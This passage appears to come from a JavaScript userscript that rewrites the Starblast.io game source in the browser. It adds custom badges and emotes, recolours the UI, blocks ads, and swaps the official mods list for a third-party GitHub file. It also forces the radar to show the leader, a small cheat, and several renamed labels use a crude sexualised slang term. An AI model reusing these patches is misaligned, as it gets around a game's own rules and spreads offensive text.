        `<title>Loading...</title><style>.wrapper{position:fixed;z-index:100;top:0;left:0;width:100%;height:100%;background:#001019;display:flex;justify-content:center;align-items:center}@keyframes rotate-loading{0%{transform:rotate(0);-ms-transform:rotate(0);-webkit-transform:rotate(0);-o-transform:rotate(0);-moz-transform:rotate(0)}100%{transform:rotate(360deg);-ms-transform:rotate(360deg);-webkit-transform:rotate(360deg);-o-transform:rotate(360deg);-moz-transform:rotate(360deg)}}@-moz-keyframes rotate-loading{0%{transform:rotate(0);-ms-transform:rotate(0);-webkit-transform:rotate(0);-o-transform:rotate(0);-moz-transform:rotate(0)}100%{transform:rotate(360deg);-ms-transform:rotate(360deg);-webkit-transform:rotate(360deg);-o-transform:rotate(360deg);-moz-transform:rotate(360deg)}}@-webkit-keyframes rotate-loading{0%{transform:rotate(0);-ms-transform:rotate(0);-webkit-transform:rotate(0);-o-transform:rotate(0);-moz-transform:rotate(0)}100%{transform:rotate(360deg);-ms-transform:rotate(360deg);-webkit-transform:rotate(360deg);-o-transform:rotate(360deg);-moz-transform:rotate(360deg)}}@-o-keyframes rotate-loading{0%{transform:rotate(0);-ms-transform:rotate(0);-webkit-transform:rotate(0);-o-transform:rotate(0);-moz-transform:rotate(0)}100%{transform:rotate(360deg);-ms-transform:rotate(360deg);-webkit-transform:rotate(360deg);-o-transform:rotate(360deg);-moz-transform:rotate(360deg)}}@keyframes rotate-loading{0%{transform:rotate(0);-ms-transform:rotate(0);-webkit-transform:rotate(0);-o-transform:rotate(0);-moz-transform:rotate(0)}100%{transform:rotate(360deg);-ms-transform:rotate(360deg);-webkit-transform:rotate(360deg);-o-transform:rotate(360deg);-moz-transform:rotate(360deg)}}@-moz-keyframes rotate-loading{0%{transform:rotate(0);-ms-transform:rotate(0);-webkit-transform:rotate(0);-o-transform:rotate(0);-moz-transform:rotate(0)}100%{transform:rotate(360deg);-ms-transform:rotate(360deg);-webkit-transform:rotate(360deg);-o-transform:rotate(360deg);-moz-transform:rotate(360deg)}}@-webkit-keyframes rotate-loading{0%{transform:rotate(0);-ms-transform:rotate(0);-webkit-transform:rotate(0);-o-transform:rotate(0);-moz-transform:rotate(0)}100%{transform:rotate(360deg);-ms-transform:rotate(360deg);-webkit-transform:rotate(360deg);-o-transform:rotate(360deg);-moz-transform:rotate(360deg)}}@-o-keyframes rotate-loading{0%{transform:rotate(0);-ms-transform:rotate(0);-webkit-transform:rotate(0);-o-transform:rotate(0);-moz-transform:rotate(0)}100%{transform:rotate(360deg);-ms-transform:rotate(360deg);-webkit-transform:rotate(360deg);-o-transform:rotate(360deg);-moz-transform:rotate(360deg)}}@keyframes loading-text-opacity{0%{opacity:0}20%{opacity:0}50%{opacity:1}100%{opacity:0}}@-moz-keyframes loading-text-opacity{0%{opacity:0}20%{opacity:0}50%{opacity:1}100%{opacity:0}}@-webkit-keyframes loading-text-opacity{0%{opacity:0}20%{opacity:0}50%{opacity:1}100%{opacity:0}}@-o-keyframes loading-text-opacity{0%{opacity:0}20%{opacity:0}50%{opacity:1}100%{opacity:0}}.loading,.loading-container{height:100px;position:relative;width:100px;border-radius:100%}.loading-container{margin:40px auto}.loading{border:4px solid transparent;border-color:transparent hsla(200,72%,61%,.7) transparent hsla(200,72%,61%,.7);-moz-animation:rotate-loading 1.5s linear 0s infinite normal;-moz-transform-origin:50% 50%;-o-animation:rotate-loading 1.5s linear 0s infinite normal;-o-transform-origin:50% 50%;-webkit-animation:rotate-loading 1.5s linear 0s infinite normal;-webkit-transform-origin:50% 50%;animation:rotate-loading 1.5s linear 0s infinite normal;transform-origin:50% 50%}.loading-container:hover .loading{border-color:hsla(200,72%,61%,.7) transparent hsla(200,72%,61%,.7) transparent}.loading-container .loading,.loading-container:hover .loading{-webkit-transition:all .5s ease-in-out;-moz-transition:all .5s ease-in-out;-ms-transition:all .5s ease-in-out;-o-transition:all .5s ease-in-out;transition:all .5s ease-in-out}#loading-text{-moz-animation:loading-text-opacity 2s linear 0s infinite normal;-o-animation:loading-text-opacity 2s linear 0s infinite normal;-webkit-animation:loading-text-opacity 2s linear 0s infinite normal;animation:loading-text-opacity 2s linear 0s infinite normal;color:hsla(200,72%,61%,.7);font-family:arial;font-size:12px;font-weight:700;margin-top:45px;opacity:0;position:absolute;text-align:center;text-transform:uppercase;top:0;left:2px;width:100px}</style><div class=wrapper><div class=loading-container><div class=loading></div><div id=loading-text>loading...</div></div></div>`
    );
    window.onbeforeunload = null;
    document.close();
    var url = 'https://starblast.io';
    var xhr = new XMLHttpRequest();
    xhr.open('GET', url);
    xhr.onreadystatechange = async function () {
        if (xhr.readyState === 4) {
            try {
                var src = xhr.responseText;
src = applyChibiBadges(src);
// ===== CUSTOM EMOTES INJECTION START =====
console.log('[Emotes] Starting emote injection');
 
function emoteinjector(gamemode, emotesadd) {
    console.log(`[Emotes] Injecting for ${gamemode}`);
 
    // Suche nach dem Gamemode mit Vocabulary
    const pattern = new RegExp(`(this\\.${gamemode}\\s*=\\s*function\\([^)]*\\)\\s*{[^}]*this\\.vocabulary\\s*=\\s*\\[)([^\\]]*)(\\])`, "m");
    const match = src.match(pattern);
 
    if (match) {
        console.log(`[Emotes] Found ${gamemode} vocabulary`);
 
        const [fullMatch, prefix, vocabArray, suffix] = match;
        let newVocab;
 
        if (gamemode === "DeathMatchMode" || gamemode === "BattleRoyaleMode") {
            // Ersetze komplett für diese Modi
            newVocab = emotesadd;
        } else {
            // Füge hinzu für andere Modi
            newVocab = vocabArray.trim() ? `${vocabArray.trim()}, ${emotesadd}` : emotesadd;
        }
 
        const replaced = `${prefix}${newVocab}${suffix}`;
        src = src.replace(fullMatch, replaced);
        console.log(`[Emotes] Successfully injected into ${gamemode}`);
    } else {
        console.warn(`[Emotes] WARNING: Could not find ${gamemode} vocabulary`);
    }
}
// ===== applyChibiBadges: fügt custom badge / ecp cases in den sbcode ein =====
function applyChibiBadges(sbcode) {
  if (typeof sbcode !== 'string') return sbcode;
 
  sbcode = sbcode.replace(
    /case\s*"pmf"\s*:\s*this\.icon\s*=\s*".*?";\s*break;/,
    `$&
            case "Midori": this.icon = "https://raw.githubusercontent.com/NNDsb/Test/refs/heads/main/MidoriChib.jpg"; break;
            case "Momoi": this.icon = "https://raw.githubusercontent.com/NNDsb/Test/refs/heads/main/MomoiChib.jpg"; break;
            case "Hina": this.icon = "https://raw.githubusercontent.com/NNDsb/Test/refs/heads/main/hinachib.png"; break;
            case "Haruka": this.icon = "https://raw.githubusercontent.com/NNDsb/Test/refs/heads/main/HarukaChib.png"; break;
            case "Kayoko": this.icon = "https://raw.githubusercontent.com/NNDsb/Test/refs/heads/main/KayokoChib.png"; break;
            case "Hikari": this.icon = "https://raw.githubusercontent.com/NNDsb/Test/refs/heads/main/HikariChib.png"; break;
            case "Miyu": this.icon = "https://raw.githubusercontent.com/NNDsb/Test/refs/heads/main/MiyuChib.png"; break;
            case "Mafuyu": this.icon = "https://raw.githubusercontent.com/NNDsb/Test/refs/heads/main/MafuyuChib.png"; break;
            case "Ako": this.icon = "https://raw.githubusercontent.com/NNDsb/Test/refs/heads/main/AkoChib.jpg"; break;
            case "Lunantium": this.icon = "https://cdn.upload.systems/uploads/v23v9rxX.png"; break;
            case "Phantom": this.icon = "https://cdn.upload.systems/uploads/VFEuukuo.png"; break;
            case "Planet": this.icon = "https://cdn.upload.systems/uploads/JgYM4GJP.png"; break;
            case "PulseFighter": this.icon = "https://cdn.upload.systems/uploads/5nQiVj9j.png"; break;
            case "Pumpkin": this.icon = "https://cdn.upload.systems/uploads/SwKwVvNW.png"; break;
            case "RedMist": this.icon = "https://cdn.upload.systems/uploads/J6JBLAPo.png"; break;
            case "TorpWitch": this.icon = "https://cdn.upload.systems/uploads/EQn2ANjs.png"; break;
            case "USniper": this.icon = "https://cdn.upload.systems/uploads/aNybDZ4c.png"; break;
            case "Web": this.icon = "https://cdn.upload.systems/uploads/iqlqorTq.png"; break;
            case "Halloween": this.icon = "https://cdn.upload.systems/uploads/bmnYN3iC.png"; break;
            case "SDCChampion": this.icon = "https://cdn.upload.systems/uploads/G8cBuNFC.png"; break;
            case "SRCChampion": this.icon = "https://cdn.upload.systems/uploads/5FE6TpHF.png"; break;
            case "Translator": this.icon = "https://cdn.upload.systems/uploads/KMEJ0ozX.png"; break;
            case "Shipdesigner": this.icon = "https://cdn.upload.systems/uploads/WF6vqocY.jpg"; break;
            case "Dev": this.icon = "https://cdn.upload.systems/uploads/9amVucAV.png"; break;
            case "SRCemerald": this.icon = "https://cdn.upload.systems/uploads/bvuVxl5q.png"; break;
            case "SRCdiamond": this.icon = "https://cdn.upload.systems/uploads/XqQRA2js.png"; break;
            case "SRCbronze": this.icon = "https://cdn.upload.systems/uploads/5VaGJLEy.jpg"; break;
            case "SRCsilver": this.icon = "https://cdn.upload.systems/uploads/apHIyN5K.png"; break;
            case "Lord": this.icon = "https://cdn.upload.systems/uploads/GMOKd0uP.png"; break;
            case "LightBeam": this.icon = "https://cdn.upload.systems/uploads/2Z3fgxK4.png"; break;
            case "Rithy": this.icon = "https://raw.githubusercontent.com/b20ea132f276271c/8741271788b42630/main/8741271788b42630/logo_rithy_agrandi-modified_200x200.png"; break;
            case "blank": this.icon = "https://cdn.upload.systems/uploads/0zNDCd9Y.png"; break;
            case "Soviet": this.icon = "https://raw.githubusercontent.com/omega10000/pic/main/800px-Soviet_Red_Army_Hammer_and_Sickle.png"; break;
            case "Zaxie": this.icon = "https://raw.githubusercontent.com/omega10000/pic/main/sluxmywv3oqmxsnmt6yj.png"; break;
            case "Omega": this.icon = "https://raw.githubusercontent.com/omega10000/pic/main/Screenshot%202024-04-24%20201658.png"; break;`
  );
 
  sbcode = sbcode.replace(/seasonal\:"Seasonal"/i,
    `$&,
            Midori: "Midori",
            Momoi: "Momoi",
            Hina: "Hina",
            Haruka: "Haruka",
            Kayoko: "Kayoko",
            Hikari: "Hikari",
			Miyu: "Miyu",
            Mafuyu: "Mafuyu",
            Ako: "Ako",`
  );
 
  return sbcode;
}
 
// Füge Emotes für verschiedene Modi hinzu
emoteinjector("TutorialMode", "{text:\"Idiot\",icon:\"y\",key:\"I\"},{text:\"Example\",icon:\"®\",key:\"J\"},{text:\"Me\",icon:\"?\",key:\"E\"},{text:\"You\",icon:\">\",key:\"D\"},{text:\"E\",icon:\"·\",key:\"V\"}");
emoteinjector("SurvivalMode", "{text:\"Discord\",icon:\"{\",key:\"D\"},{text:\"Love\",icon:\"❤️\",key:\"I\"},{text:\"Me\",icon:\"O\",key:\"E\"},{text:\"Cunny\",icon:\"S\",key:\"V\"},{text:\"You\",icon:\"N\",key:\"J\"}");
emoteinjector("TeamMode", "{text:\"Example\",icon:\"®\",key:\"I\"},{text:\"Example\",icon:\"®\",key:\"J\"},{text:\"contribute\",icon:\"°\",key:\"L\"},{text:\"Hello\",icon:\":\",key:\"W\"},{text:\"Bye\",icon:\"F\",key:\"H\"}");
emoteinjector("InvasionMode", "{text:\"Example\",icon:\"®\",key:\"T\"},{text:\"Example\",icon:\"®\",key:\"J\"},{text:\"Alien\",icon:\"0\",key:\"W\"},{text:\"Boss\",icon:\"¿\",key:\"V\"}");
emoteinjector("DeathMatchMode", "{text:\"Good Game\",icon:\"GG\",key:\"G\"}");
emoteinjector("BattleRoyaleMode", "{text:\"Good Game\",icon:\"GG\",key:\"G\"}");
 
// Debug: Überprüfe ob Emotes hinzugefügt wurden
console.log('[Emotes] Injection completed. Verification:');
console.log('TutorialMode contains "Idiot":', src.includes('"Idiot",icon:"y",key:"I"'));
console.log('SurvivalMode contains "DC BAK":', src.includes('"DC BAK",icon:"{",key:"D"'));
console.log('TeamMode contains "contribute":', src.includes('"contribute",icon:"°",key:"L"'));
 
// ===== CUSTOM EMOTES INJECTION END =====
                if (src != undefined) {
                } else {
                    Client.log(`Src fetch failed`);
                }
                let prevSrc = src;
 
                Client.checkSrcChange = function (msg) {
                    if (src == prevSrc) console.error(`failed to modify game at ${msg}`);
                    prevSrc = src;
                };
                Client.log(`starting modifying...`);
                window.adjustColor = function (hex, percent) {
                    if (!/^#?[0-9A-Fa-f]{6}$/.test(hex)) return hex;
                    hex = hex.replace(/^#/, '');
 
                    let r = parseInt(hex.slice(0, 2), 16);
                    let g = parseInt(hex.slice(2, 4), 16);
                    let b = parseInt(hex.slice(4, 6), 16);
 
                    const factor = 1 + percent / 100;
 
                    r = Math.min(255, Math.max(0, Math.round(r * factor)));
                    g = Math.min(255, Math.max(0, Math.round(g * factor)));
                    b = Math.min(255, Math.max(0, Math.round(b * factor)));
 
                    return `#${r.toString(16).padStart(2, '0')}${g.toString(16).padStart(2, '0')}${b.toString(16).padStart(2, '0')}`;
                };
                const carbonMatch = src.match(/t\.prototype\.buildCarbonMaterial.*?emissiveMap:([iI10OlL]{5})/);
                const carbonEmissiveMap = carbonMatch[0].match(/emissiveMap\:[iI10OlL]{5}/);
                const alloyMatch = src.match(/t\.prototype\.buildAlloyMaterial.*?emissiveMap\:[iI10OlL]{5}/);
                const alloyEmissiveMap = alloyMatch[0].match(/emissiveMap\:[iI10OlL]{5}/);
                const mapregex = src.match(/t\.prototype\.buildCarbonMaterial.*?map\:[iI10OlL]{5}/);
                const mapvalue = mapregex[0].match(/[iI10OlL]{5}/);
                const emissiveregex = src.match(/emissive\:[iI10OlL]{5}/);
                const fullemmisiv = emissiveregex[0].match(/[iI10OlL]{5}/);
                const brugs = src.match(/(.)\.([iI10OlL]{5})\.([iI10OlL]{5})\.custom\[(.)\]=(.)\[(.)\]/);
                const ivalue = src.match(/(.)=this\.[iI10OlL]{5}\.names\.getcustom\(.\.[iI10OlL]{5}\.status\.id\)/i)[1];
                src = src.replace(/(.)=new\s*([iI10OlL]{5})\(this\.([iI10OlL]{5})\.mode\.([iI10OlL]{5})\.ships_by_code\[t\.([iI10OlL]{5})\.status\.type],(.)\/360\)/i, `this.shipycolor = ${ivalue}?.laser?.includes("!") ? ${ivalue}.laser.split("!")[1] : null, $1=new $2(this.$3.mode.$4.ships_by_code[t.$5.status.type],$6/360, null,null, this.shipycolor)`)
                src = src.replace(/t\.prototype\.([iI10OlL]{5})=function\((.)\)\{var\s*(.,.,.,.,.,.,.);(return\s*.=new)/i, 't.prototype.$1=function($2){var $3,custom,laserColor;$4');
                src = src.replace(/(.=new\s*[iI10OlL]{5}\(this\.[iI10OlL]{5}\.mode\.[iI10OlL]{5}\.ships_by_code\[.\.code\],.\/360)\),/i, '$1,null,null, laserColor),')
                const ggez = src.match(/,.=.\.hue,this\.[iI10OlL]{5}\.mode/)[0].match(/([iI10OlL]{5})/)[0];
                src = src.replace(/,.\.read\((.)\),/i, `$&custom = this.${ggez}.names.getCustom($1.getUint8(1)),laserColor = custom?.laser?.includes("!") ? custom.laser.split("!")[1] : null,`)
                src = src.replace(
                    /(this\.[iI10OlL]{5}=function\(\)\{function t\(t,e,i,s)(\)\{)var (.*?)if\(/,
                    "$1,color$2var $3this.shipcolor = color != null ? color : null;if("
                );
                const ggezy = src.match(/(this\.laserticles\.[iI10OlL]{5}\.[iI10OlL]{5}\.)mode\.anonymous_ships/)[1];
                src = src.replace(/this\.laserticles\s*=\s*.,/, `$&this.ggcustom = ${ggezy}names.getCustom(this.shipid),console.log(t.getUint8(i + 30)),`);
                src = src.replace(
                    /this\.type=(.)\.getUint8\((.)\+30\)/,
                    'this.type = $1.getUint8($2 + 30) === 6 ? $1.getUint8($2 + 30) : (this.ggcustom?.laser.includes("!") ? this.ggcustom.laser.split("!")[0] : $1.getUint8($2 + 30))'
                );
                src = src.replace(brugs[0]+',', `${brugs[1]}.${brugs[2]}.${brugs[3]}.custom[${brugs[4]}] = ${brugs[4]} === "laser" ? ${brugs[5]}[${brugs[6]}] + "!" + JSON.parse(localStorage.getItem("shpcolorr")) : ${brugs[5]}[${brugs[6]}],`);
                src = src.replace(`indexOf(${brugs[1]}.${brugs[2]}.${brugs[3]}.custom[${brugs[4]}]),`, `indexOf(${brugs[4]} === "laser" && ${brugs[1]}.${brugs[2]}.${brugs[3]}.custom[${brugs[4]}].includes("!") ? ${brugs[1]}.${brugs[2]}.${brugs[3]}.custom[${brugs[4]}].split("!")[0] : ${brugs[1]}.${brugs[2]}.${brugs[3]}.custom[${brugs[4]}]),`)
                const finishfunc = `t.prototype.fullbolor=function(){
    console.log(".");
    return this.material=new THREE.MeshPhongMaterial({
        map:${mapvalue},
        bumpMap:${mapvalue},
        specular:0xffffff, // maximales Weißlicht für stärksten Glanz
        shininess:1000,    // extrem glänzend
        reflectivity:1,    // maximale Spiegelung
        bumpScale:.05,     // feiner für bessere Glanzwirkung
        color:(this.shipcolor != undefined) ? this.shipcolor : JSON.parse(localStorage.getItem('shpcolorr')),
        ${emissiveregex}.hsvToRgbHex(this.hue, 1, 1),
        ${carbonEmissiveMap}
    })},`;
 
const finishcolor =
    'case"bamaterial":let color;if (this.laser.split("!")[1] == null){color = JSON.parse(localStorage.getItem("shpcolorr"))}else {color = this.laser.split("!")[1]}; for(s=t.createLinearGradient(0,0,0,i),h=Math.min(10,this.size/10),n=a=0,u=h-1;a<=u;n=a+=1)s.addColorStop(n/h,color),s.addColorStop((n+1)/h,window.adjustColor(color, 53));for(l=t.createLinearGradient(0,0,0,i),l.addColorStop(0,window.adjustColor(color, 20)),l.addColorStop(.1,window.adjustColor(color, 53)),n=o=0,d=h-1;o<=d;n=o+=1)l.addColorStop((n+.5)/h,color),l.addColorStop(Math.min(1,(n+1.5)/h),window.adjustColor(color, 53));break;';
 
const finishcheese = 'case "bamaterial":this.fullbolor();break;';
 
src = src.replace(/case\s*"carbon"\s*:\s*this\.buildCarbonMaterial\(\);break;\n?/g, '$&' + finishcheese);
Client.checkSrcChange('finish cheese');
 
src = src.replace(/t\.prototype\.buildCarbonMaterial\s*=\s*function\s*\([^)]*\)\s*{[^}]*}\)},/g, '$&' + finishfunc);
Client.checkSrcChange('finish func');
 
src = src.replace(/case\s*"titanium"\s*:(s=t.createLinearGradient\(0,0,0,i\),[\s\S]*?);break;/g, '$&' + finishcolor);
Client.checkSrcChange('finish color');
 
src = src.replace(/carbon\:"Carbon"/i, '$&,bamaterial:"Custom Material"');
Client.checkSrcChange('finish adder');
 
src = src.replace('"carbon"===this.finish', '"carbon"===this.finish || "bamaterial"===this.finish');
Client.checkSrcChange('finish check carbon');
 
src = src.replace(/laser\:localstorage\.getitem\("laser"\)/gi, '$&+"!"+JSON.parse(localStorage.getItem("shpcolorr"))');
 
let pfstart = performance.now();
let settingsregex = src.match(/music:\{[^{}]*\},/);
let settingsmatch = settingsregex[0].match(/[iI10OlL]{4,6}/g);
let newrgs = src.match(/e\.[iI10OlL]{4,6}\.[iI10OlL]{4,6}\.beep\(4\+\.2\*math\.random\(\)/gi);
let newnewrgs = newrgs[0].match(/[iI10OlL]{4,6}/g);
let reegtest = src.match(
    /if\("select"!==(\w+\.)type\)e\+='<div\s*class="option">'\+t\(\w+\.name\)\+'<label\s*class="switch"><input\s*type="checkbox"\s*'\+\(\w+\.value\?'checked="checked"':""\)\+'\s*id="'\+(\w+)\+'""><div\s*class="slider"><\/div><\/label><\/div>';/
);
 
                if (reegtest) {
                    try {
                        src = src.replace(
                            reegtest[0],
                            `if ("select" !== ${reegtest[1]}type) if ("color" === ${reegtest[1]}type) { e += '<div class="option">' + t(${reegtest[1]}name) + '<div class="range" style=\\"cursor: pointer;\\">\\n  <input id=\\'\' + ${reegtest[2]} + "' type=\\"color\\" style=\\"-webkit-appearance:none;width:130px;border:transparent;background:transparent\\">\\n<span id='" + ${reegtest[2]} + "_value'>" + ${reegtest[1]}value + "</span>\\n  </div>\\n</div>";} else {e+='<div class="option">'+t(${reegtest[1]}name)+'<label class="switch"><input type="checkbox" '+(${reegtest[1]}value?'checked="checked"':"")+' id="'+ ${reegtest[2]} +'""><div class="slider"></div></label></div>'}`
                        );
                        Client.checkSrcChange('SettingBuilder');
                    } catch (error) {
                        console.error(error);
                    }
                }
                //--// Lowercase Name
                src = src.replace(/\.toUpperCase\(\)/g, '');
                Client.checkSrcChange('LowerCase function');
                src = src.replace(/text-transform:\s*uppercase;/gim, '');
                Client.checkSrcChange('lowercase css');
                //--// Always show Leader
                src = src.replace(/this\.[iI10OlL]{3,6}\.mode\.radar_shows_leader/g, '1');
                Client.checkSrcChange('Always Leader');
                //--// Custom Names
                src = src.replace('Elite Commander Pass', 'I <3 Cunny');
                Client.checkSrcChange('Noob Pass');
                src = src.replace('LEADERBOARD', 'Skill Issue');
                Client.checkSrcChange('Leaderboard name fix');
                src = src.replace('Team Mode', 'Dumb Mates');
                src = src.replace('Survival Mode', 'Stacker Mode');
                src = src.replace('Pro Deathmatch', 'Dead Mode');
                src = src.replace('PLAY', 'Die');
                src = src.replace('Create custom game', 'Nuh Uh');
                src = src.replace("FPS", "");
                src = src.replace("(Europe)", "(Asia)");
                src = src.replace("Leaderboard", "Skill Issue Liste");
                src = src.replace("Kapazität", "Nicht so toll");
                src = src.replace("Regeneration", "GOAT");
                src = src.replace("Geschwindigkeit", "Kelickk");
                src = src.replace('Modding Space', 'Underrated');
                src = src.replace("Sprache", "Nein, das änderst du nicht!");
                //-// Custom Loading Names
                src = src.replace("Verbinde mit der galaktischen Sicherheitsdatenbank", "<3");
                src = src.replace("Verbinde mit Hauptquartier der Rebellen", "<3");
                src = src.replace("Hole Konfliktkarte der Föderation", "<3");
                src = src.replace("Verbunden", "Connecting...");
                src = src.replace("Sprung zu Galaxie", "Warping to:");
                //-// Custom Ecps + Fix
                src = src.replace('||(this.icon="https://starblast.io/ecp/gamepedia.png")', '||(this.icon=this.icon)');
                //--// Ping Reducer Visual
                src = src.replace(/>20\?/, '>30?');
                Client.checkSrcChange('Ping reducer 30');
                src = src.replace(/this\.ping_value=\.9\*/, 'this.ping_value=.0*');
                Client.checkSrcChange('Ping reducer value');
                src = src.replace(/60===this\.ping_count/, '0===this.ping_count');
                Client.checkSrcChange('Ping Reducer ping count');
                src = src.replace(/this\.ping_total\/60<80/, 'this.ping_total/0<0');
                Client.checkSrcChange('Ping reducer total ping');
                //--// custom Badge detection / See blank ecps
                src = src.replace(/"blank"\s*!==\s*this\.custom\.badge/, '""!==this.custom.badge');
                Client.checkSrcChange('blank is custom');
                src = src.replace(/case"star":.*?break;/g, `$&case"blank":t.fillStyle="hsla(200, 0%, 0%, 0)";break;`);
                Client.checkSrcChange('Add blank as ecp');
                src = src.replace(/default:t.fillStyle="hsl\(200,50%,20%\)"/, 'default:t.fillStyle = "hsl(50,100%,50%)"');
                Client.checkSrcChange('Custom ecp detect 1');
                src = src.replace(
                    /default:t\.fillStyle="hsl\(50,100%,70%\)",t\.fillText\("S",e\/2,i\/2\)/,
                    'case"star":t.fillStyle="hsl(50,100%,70%)",t.fillText("S",e/2,i/2);break;case"blank":t.fillStyle="hsla(200, 0%, 0%, 1)";break;default:t.fillStyle="hsl(0,50%,30%)",t.fillText("8",e/2,i/2)'
                );
                Client.checkSrcChange('Custom ecp detect 2');
                //-// Custom Logo
                src = src.replace(/src="https:\/\/starblast\.data\.neuronality\.com\/img\/starblast_io_logo\.svg\?3"/, 'src="https://raw.githubusercontent.com/NNDsb/Test/refs/heads/main/o7KgOAAAABklEQVQDAKUyjRkBfv1hAAAAAElFTkSuQmCC-removebg-preview.png"')
                //--// Always all Mods
                src = src.replace('https://starblast.io/modsinfo.json', 'https://raw.githubusercontent.com/officialtroller/starblast-things/refs/heads/main/modsinfo.js');
                Client.checkSrcChange('All mods');
                //--// High Contrast Material Colors
                src = src.replace(/this\.hue,\.5,1/g, 'this.hue,1,1');
                src = src.replace(/this\.hue,\.5,.5/g, 'this.hue,1,.5');
                Client.checkSrcChange('Material hue .5,1');
                //--// Client Fixes
                src = src.replace(/(\.modal\s\.modecp\s*\{\s*[^}]*bottom:\s*)0\b/, '$1auto');
                Client.checkSrcChange('modding space css fix');
                src = src.replace('NEW!', ' ');
                Client.checkSrcChange('modding space new remover');
                src = src.replace(/\(\),this.showModal\("donate"\)/g, '(), this.showModal("donate"), ClientStorage.scroll.bar()');
                Client.checkSrcChange("Scroll ECP's");
                src = src.replace('html5.api.gamedistribution.com/libs/gd/api.js', 'ads.blocked');
                Client.checkSrcChange('ad blocker gamedistribution');
                src = src.replace('https://sdk.crazygames.com/crazygames-sdk-v1.js', 'https://ads.blocked');
                Client.checkSrcChange('ad blocker crazygames');
                src = src.replace('api.adinplay.com/libs/aiptag/pub/NRN/starblast.io/tag.min.js', 'ads.blocked');
                Client.checkSrcChange('ad blocker adinplay');
// Ersetzt fest eingetragene Blautöne durch unsere Variable
src = src
  .replace(/hsla?\(200,[^)]+\)/gi, 'var(--chibi-ui-color)')
  .replace(/#00bcd4/gi, 'var(--chibi-ui-color)')
  .replace(/#9baacf/gi, 'var(--chibi-ui-color)');
Client.checkSrcChange('Replaced static blue tones with variable UI color');
 
src = src.replace(
  /for\(f=document\.queryselectorall\("\.option\s*input\[type=range\]"\),\s*i=function\(e\)\{.*?,1\)\}\)\}\}/gis,
  `for (f = document.querySelectorAll(".option input[type=range], .option input[type=color]"), i = function(e) {
      return function(i) {
          if (i.type === "range") {
              if (i.id === "emopacity") {
                  i.addEventListener("input", function (s) {
                      const x = document.querySelector("#" + i.id + "_value");
                      x.innerText = parseInt(i.value, 10);
                      e.updateSettings(s, !0);
                  });
              } else {
                  i.addEventListener("input", function (s) {
                      const x = document.querySelector("#" + i.id + "_value");
                      x.innerText = "0" === i.value ? t("Off") : Math.round(50 * i.value) + " %";
                      e.updateSettings(s, !0);
                  });
                  i.dispatchEvent(new Event("input"));
                  if (i.id === "sounds") {
                      i.addEventListener("change", function () {
                          e.${newnewrgs[0]}.${newnewrgs[1]}.beep(4 + .2 * Math.random(), 1);
                      });
                  }
              }
          } else if (i.type === "color") {
              const updateColor = (getter, setter, onChangeExtra) => {
                  i.addEventListener("input", function (s) {
                      const x = document.querySelector("#" + i.id + "_value");
                      x.innerText = i.value;
                      if (setter) setter(i.value); // Wert speichern
                      if (onChangeExtra) onChangeExtra(i.value); // z. B. UI live aktualisieren
                      e.updateSettings(s, !0);
                  });
                  i.addEventListener("change", function () {
                      i.value = getter();
                      const el = document.querySelector("#" + i.id + "_value");
                      if (el) el.innerText = i.value;
                  });
                  i.value = getter();
              };
 
              if (i.id === "gemindeed") {
                  updateColor(ClientStorage.gem1);
              } else if (i.id === "gemindeed1") {
                  updateColor(ClientStorage.gem2);
              } else if (i.id === "shpcolorr") {
                  updateColor(ClientStorage.spcolor);
              } else if (i.id === "uicolor1") {
                  // Primäre UI-Farbe
                  updateColor(
                      ClientStorage.uiColor1,
                      val => localStorage.setItem("uiColor1", JSON.stringify(val)),
                      () => { if (window.applyUIGradient) applyUIGradient(); }
                  );
              } else if (i.id === "uicolor2") {
                  // Sekundäre UI-Farbe (Gradient)
                  updateColor(
                      ClientStorage.uiColor2,
                      val => localStorage.setItem("uiColor2", JSON.stringify(val)),
                      () => { if (window.applyUIGradient) applyUIGradient(); }
                  );
              }
          }
      }
  }`
);
Client.checkSrcChange("Settings handler for range/color inputs");
 
src = src.replace(
    /shake:\{[^{}]*\},/,
    '$&selftag:{name:"Self Ship Tag",value:!0,skipauto:!0,filter:"default,app,mobile"},blorus:{name:"Blur Page",value:!0,skipauto:!0,filter:"default,app,mobile"},'
);
Client.checkSrcChange("default settings extended");
 
src = src.replace(
    settingsregex,
    `$&emopacity:{name:"Emote Capacity",value:4,skipauto:!0,type:"range",min:1,max:5,${settingsmatch}:1,filter:"default,app,mobile"},
    shpcolorr:{name:"Ship Color",value:ClientStorage.spcolor(),skipauto:true,type:"color",filter:"default,app,mobile"},
    gemindeed:{name:"Gem Color 1",value:ClientStorage.gem1(),skipauto:true,type:"color",filter:"default,app,mobile"},
    gemindeed1:{name:"Gem Color 2",value:ClientStorage.gem2(),skipauto:true,type:"color",filter:"default,app,mobile"},
    uicolor1:{name:"UI Color 1",value:ClientStorage.uiColor1(),skipauto:true,type:"color",filter:"default,app,mobile"},
    uicolor2:{name:"UI Color 2",value:ClientStorage.uiColor2(),skipauto:true,type:"color",filter:"default,app,mobile"},
    radar_lines:{name:"Radar Lines",value:ClientStorage.radar_lines(),skipauto:true,type:"check",filter:"default,app,mobile"},`
);
Client.checkSrcChange("UI color + gem colors + emote capacity added");
 
                //--// Custom Material Detection
                const titreg = src.match(/case\s*"titanium"\s*:(\w+)=t.createLinearGradient\(0,0,0,i\),[\s\S]*?;break;/);
                src = src.replace(titreg[0], `$&case"zinc":${titreg[1]}=t.createLinearGradient(0,0,0,i),${titreg[1]}.addColorStop(0,"#EEE"),${titreg[1]}.addColorStop(1,"#666");break;`);
                Client.checkSrcChange('custom material detect 1');
                const defreg = src.match(/default:(\w+)=t\.createLinearGradient\(0,0,0,i\),\w+\.addColorStop\(0,"#EEE"\),\w+\.addColorStop\(1,"#666"\)/);
                src = src.replace(
                    defreg[0],
                    `default:${defreg[1]}=t.createLinearGradient(0,0,0,i),${defreg[1]}.addColorStop(0,"hsl(0,100%,50%)"),${defreg[1]}.addColorStop(.5,"hsl(60,100%,50%)"),${defreg[1]}.addColorStop(.5,"hsl(120,100%,50%)"),${defreg[1]}.addColorStop(1,"hsl(180,100%,50%)")`
                );
                Client.checkSrcChange('custom material detect 2');
                let pfend = performance.now();
                Client.log(`Modified the Game in ${(pfend - pfstart).toFixed(0)}ms`);
                Client.log('Loading Document');
                document.open();
                document.write(src);
                document.close();
                Client.log('Document loaded');
                Client.log(`Appliying Looks...`);
                const originalSend = WebSocket.prototype.send;
 
/*                 WebSocket.prototype.send = function (data) {
                    console.log(`%c[Client Message sent:] ${data}`, 'color: red');
                    return originalSend.apply(this, arguments);
                }; */
                let lookstart = performance.now();
                let sbibt = document.createElement('script');
